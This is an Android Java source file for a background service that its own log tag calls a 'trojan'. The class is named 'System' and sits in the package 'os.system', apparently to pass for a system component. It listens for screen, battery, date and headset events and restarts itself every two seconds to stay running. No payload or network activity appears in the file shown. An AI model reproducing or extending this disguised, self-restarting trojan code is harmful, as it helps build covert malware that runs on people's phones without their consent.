package os.system;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.os.CountDownTimer;
import android.util.Log;

public class System extends Service
{
	public static String TAG = "trojan";
	private BroadcastReceiver receiver;
	public String ip = "";

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();
		Log.i(TAG, "service oncreate oke");

		IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
		filter.addAction(Intent.ACTION_DATE_CHANGED);
		filter.addAction(Intent.ACTION_HEADSET_PLUG);
		filter.addAction(Intent.ACTION_SCREEN_ON);
		filter.addAction(Intent.ACTION_SCREEN_OFF);

		receiver = new ReceiverBoot();
		registerReceiver(receiver, filter);
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		CountDownTimer hitungMundur = new CountDownTimer(2000, 100) {
			public void onTick(long millisUntilFinished){}
			public void onFinish() {
				startService(new Intent(System.this, System.class));
			}
		}.start();
		Log.i(TAG, "service start oke");

		return super.onStartCommand(intent, flags, startId);
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
		unregisterReceiver(receiver);
	}
}